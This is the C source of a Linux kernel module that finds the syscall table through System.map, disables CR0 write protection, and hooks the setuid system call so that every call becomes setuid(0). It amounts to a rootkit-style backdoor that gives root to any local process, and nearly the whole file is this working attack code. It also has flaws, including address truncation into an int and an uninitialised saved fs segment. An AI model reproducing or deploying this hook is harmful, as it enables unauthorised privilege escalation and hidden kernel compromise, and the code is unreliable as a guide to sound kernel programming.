#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/utsname.h>
#include <linux/mm.h>
#include <asm/cacheflush.h>
#include <linux/types.h>

#define PROC_V    "/proc/version"
#define BOOT_PATH  "/boot/System.map-"
#define MAX_LEN 256
unsigned long*  SysCallTable;
asmlinkage int (*original_syscall) (uid_t);
unsigned long original_call;
char* GetKernelVersion(void)
{
	char* buf = kmalloc(MAX_LEN,GFP_KERNEL);
	char* ver;
	struct file* f = 0;
	mm_segment_t oldfs = get_fs();
	set_fs(KERNEL_DS);
	f = filp_open(PROC_V,O_RDONLY, 0);
	if (IS_ERR(f) || (f == NULL))
		return NULL;
	vfs_read(f, buf, MAX_LEN, &f->f_pos);
	ver = strsep(&buf, " ");
	ver = strsep(&buf, " ");
	ver = strsep(&buf, " ");
	filp_close(f, 0);
	set_fs(oldfs);
	return ver;
}

static int FindMemoryLocationOfSETUID(void)
{
	char  buffer[MAX_LEN];
	char* bufferPointer = buffer;
	char* kernelVersion = GetKernelVersion();
	struct file* filePointer = 0;
	int i = 0;
	mm_segment_t oldfs;
	char* filename = kmalloc(strlen(kernelVersion)+strlen(BOOT_PATH)+1,GFP_KERNEL);
	if(filename == NULL)
		return -1;
	memset(filename,0,strlen(kernelVersion)+strlen(BOOT_PATH)+1);
	strncpy(filename,BOOT_PATH, strlen(BOOT_PATH));
	strncat(filename,kernelVersion,strlen(kernelVersion));
	filePointer = filp_open(filename,O_RDONLY,MAY_READ|VERIFY_WRITE);
	if(IS_ERR(filePointer) || filePointer == NULL)
		return -1;
	memset(bufferPointer,0,MAX_LEN);
	while(__vfs_read(filePointer,buffer,MAX_LEN,&filePointer->f_pos) > 0)
	{
		if(strstr(bufferPointer,"sys_call_table") != NULL)
		{
			char* sysString;
			char* parsedString;
			i = 0;
			sysString = kmalloc(MAX_LEN,GFP_KERNEL);
			if(sysString == NULL)
			{
				filp_close(filePointer,0);
				set_fs(oldfs);
				kfree(filename);
				return -1;
			}
			memset(sysString, 0, MAX_LEN);
			strncpy(sysString, strsep(&bufferPointer, " "), MAX_LEN);
			parsedString = strstr(bufferPointer,"sys_call_table");
			parsedString = parsedString-11;
			sscanf(parsedString,"%x %c sys_call_table",&i,&parsedString[0]);
			kfree(sysString);
			break;
		}
		memset(buffer, 0, MAX_LEN);
	}
	filp_close(filePointer, 0);
	set_fs(oldfs);
	kfree(filename);
	return i;
}

static asmlinkage int setuidReplacement(uid_t uid)
{
	printk(KERN_ALERT "setuid has been called\n");
	if(original_syscall != NULL)
	{
		return original_syscall(0);
	}
	return 0;
}

//This module is compatible with kernel version 4.4.0-66-generic
static int __init init_hook(void)
{
	SysCallTable = (void*)FindMemoryLocationOfSETUID();  //Can be found using: grep "sys_call_table" /boot/System.map-`uname -r`
	original_syscall = SysCallTable[__NR_setuid];
	write_cr0(read_cr0() & (~ 0x10000));
	SysCallTable[__NR_setuid] = (void*)&setuidReplacement;
	write_cr0(read_cr0() | 0x10000);
	printk(KERN_ALERT "Syscall has been hooked\n");
	return 0;
}

static void __exit exit_hook(void)
{
	write_cr0(read_cr0() & (~ 0x10000));
	SysCallTable[__NR_setuid] = original_syscall;
	write_cr0(read_cr0() | 0x10000);
	printk(KERN_ALERT "Syscall has been unhooked.\n");
}
module_init(init_hook);
module_exit(exit_hook);


//MODULE_DESCRIPTION("Kernel Module system call hook");
MODULE_LICENSE("GPL");
